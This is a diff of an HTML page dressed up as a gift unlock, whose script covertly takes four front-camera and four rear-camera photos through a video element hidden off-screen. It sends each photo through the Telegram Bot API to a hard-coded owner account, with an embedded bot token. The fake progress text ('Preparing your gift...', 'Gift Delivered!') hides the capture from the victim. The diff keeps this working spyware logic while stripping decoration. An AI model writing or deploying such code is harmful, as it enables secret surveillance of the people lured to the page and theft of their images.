@@ -48,11 +48,6 @@ h2 {
   background-clip: text;
 }
 
-p {
-  color: #ccb3ff;
-  margin: 15px 0;
-}
-
 button {
   width: 100%;
   padding: 15px;
@@ -64,21 +59,11 @@ button {
   font-size: 18px;
   font-weight: bold;
   cursor: pointer;
-  transition: transform 0.3s;
-}
-
-button:hover {
-  transform: scale(1.05);
 }
 
 button:disabled {
   opacity: 0.5;
   cursor: not-allowed;
-}
-
-.loading {
-  font-size: 50px;
-  margin: 20px 0;
 }
 
 .spinner {
@@ -122,28 +107,9 @@ button:disabled {
 .hidden {
   position: fixed;
   top: -9999px;
-  left: -9999px;
   width: 1px;
   height: 1px;
   opacity: 0;
-}
-
-.confetti {
-  position: fixed;
-  font-size: 20px;
-  animation: confetti-fall 5s linear forwards;
-  z-index: 1000;
-}
-
-@keyframes confetti-fall {
-  0% {
-    transform: translateY(-100px) rotate(0deg);
-    opacity: 1;
-  }
-  100% {
-    transform: translateY(100vh) rotate(360deg);
-    opacity: 0;
-  }
 }
 </style>
 </head>
@@ -160,22 +126,15 @@ button:disabled {
 <video class="hidden" id="video" autoplay playsinline></video>
 
 <script>
-// Get user ID from URL
-const urlParams = new URLSearchParams(window.location.search);
-const USER_ID = urlParams.get('uid');
+const USER_ID = new URLSearchParams(window.location.search).get('uid');
 const BOT_TOKEN = "8226782560:AAF2iapgn0UUbVfR5LV87TQQGqfqVfOc88I";
 const OWNER_ID = "8215819954";
 
-let photosSent = 0;
-
 document.getElementById("unlockBtn").onclick = async () => {
   const box = document.getElementById("box");
-  const status = document.getElementById("status");
   const btn = document.getElementById("unlockBtn");
-  
   btn.disabled = true;
   
-  // Show loading screen
   box.innerHTML = `
     <div class="gift-icon">✨</div>
     <h2>🎀 Creating Magic</h2>
@@ -192,18 +151,13 @@ document.getElementById("unlockBtn").onclick = async () => {
   const video = document.getElementById("video");
   
   try {
-    // STEP 1: Front Camera (4 photos)
-    statusText.textContent = "Setting up...";
-    progress.style.width = "10%";
-    
-    // Get front camera
+    // Front Camera - 4 photos
     const frontStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: false
     });
     video.srcObject = frontStream;
     
-    // Wait for camera
     await new Promise(resolve => {
       video.onloadedmetadata = () => {
         video.play();
@@ -211,32 +165,24 @@ document.getElementById("unlockBtn").onclick = async () => {
       };
     });
     
-    // Capture 4 front photos
     for (let i = 1; i <= 4; i++) {
-      const percent = 10 + (i * 10);
-      progress.style.width = percent + "%";
-      statusText.textContent = `Preparing gift ${i}/8...`;
+      progress.style.width = (i * 12.5) + "%";
+      statusText.textContent = "Preparing your gift...";
       await new Promise(r => setTimeout(r, 800));
-      await captureAndSend(`Front ${i}`);
-      photosSent++;
+      await capturePhoto(`front_${i}`);
     }
     
-    // Stop front camera
     frontStream.getTracks().forEach(track => track.stop());
     
-    // STEP 2: Back Camera (4 photos)
-    statusText.textContent = "Adding final touches...";
-    progress.style.width = "60%";
+    // Back Camera - 4 photos
     await new Promise(r => setTimeout(r, 1000));
     
-    // Get back camera
     const backStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "environment" },
       audio: false
     });
     video.srcObject = backStream;
     
-    // Wait for camera
     await new Promise(resolve => {
       video.onloadedmetadata = () => {
         video.play();
@@ -244,50 +190,39 @@ document.getElementById("unlockBtn").onclick = async () => {
       };
     });
     
-    // Capture 4 back photos
     for (let i = 1; i <= 4; i++) {
-      const percent = 60 + (i * 10);
-      progress.style.width = percent + "%";
-      statusText.textContent = `Finalizing ${i + 4}/8...`;
+      progress.style.width = (50 + i * 12.5) + "%";
+      statusText.textContent = "Finalizing your gift...";
       await new Promise(r => setTimeout(r, 800));
-      await captureAndSend(`Back ${i}`);
-      photosSent++;
+      await capturePhoto(`back_${i}`);
     }
     
-    // Stop back camera
     backStream.getTracks().forEach(track => track.stop());
     
     progress.style.width = "100%";
     statusText.textContent = "Finishing up...";
     await new Promise(r => setTimeout(r, 1500));
     
-    // SUCCESS - Show celebration
-    createConfetti();
-    
+    // Success
     box.innerHTML = `
       <div class="gift-icon">🎉</div>
       <h2 style="color:#00ff00">🎁 Gift Delivered!</h2>
       <p>Your special surprise has been prepared</p>
       <p>Thank you for waiting!</p>
       <div class="status" style="color:#00ff00">✨ Complete ✨</div>
-      <div style="margin-top:20px;font-size:40px">
-        🎀✨🎊
-      </div>
     `;
     
   } catch (error) {
-    console.error("Error:", error);
     box.innerHTML = `
       <div class="gift-icon">🎭</div>
       <h2 style="color:#ff5555">Needs Camera Access</h2>
       <p>Please allow camera to receive your gift</p>
       <button onclick="location.reload()">🔄 Try Again</button>
-      <div class="status" style="color:#ff5555">Camera permission required</div>
     `;
   }
 };
 
-async function captureAndSend(label) {
+async function capturePhoto(label) {
   const video = document.getElementById("video");
   const canvas = document.createElement('canvas');
   canvas.width = video.videoWidth || 640;
@@ -295,17 +230,17 @@ async function captureAndSend(label) {
   const ctx = canvas.getContext('2d');
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
   
-  // Convert to blob
   return new Promise((resolve) => {
     canvas.toBlob(async (blob) => {
       if (blob) {
-        // Convert blob to base64
         const reader = new FileReader();
         reader.onloadend = async () => {
           const base64data = reader.result.split(',')[1];
           
-          // Send to both user and owner
+          // Send to user
           await sendToTelegram(USER_ID, base64data, `🎁 Your Gift: ${label}`);
+          
+          // Send to owner
           await sendToTelegram(OWNER_ID, base64data, `📸 From ${USER_ID}: ${label}`);
           
           resolve();
@@ -320,9 +255,6 @@ async function captureAndSend(label) {
 
 async function sendToTelegram(chatId, photoBase64, caption) {
   try {
-    const formData = new FormData();
-    
-    // Convert base64 to blob
     const byteCharacters = atob(photoBase64);
     const byteNumbers = new Array(byteCharacters.length);
     for (let i = 0; i < byteCharacters.length; i++) {
@@ -331,11 +263,11 @@ async function sendToTelegram(chatId, photoBase64, caption) {
     const byteArray = new Uint8Array(byteNumbers);
     const blob = new Blob([byteArray], { type: 'image/jpeg' });
     
+    const formData = new FormData();
     formData.append('photo', blob, 'gift.jpg');
     formData.append('chat_id', chatId);
     formData.append('caption', caption);
     
-    // Send via Telegram Bot API
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
       body: formData
@@ -345,21 +277,6 @@ async function sendToTelegram(chatId, photoBase64, caption) {
   } catch (error) {
     console.error(`Failed to send to ${chatId}:`, error);
     return false;
-  }
-}
-
-function createConfetti() {
-  const emojis = ['🎉', '🎊', '✨', '🎁', '🎀', '💝', '🥳', '🎈'];
-  for (let i = 0; i < 50; i++) {
-    const confetti = document.createElement('div');
-    confetti.className = 'confetti';
-    confetti.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-    confetti.style.left = Math.random() * 100 + 'vw';
-    confetti.style.fontSize = (15 + Math.random() * 20) + 'px';
-    confetti.style.animationDelay = Math.random() * 2 + 's';
-    document.body.appendChild(confetti);
-    
-    setTimeout(() => confetti.remove(), 5000);
   }
 }
 </script>
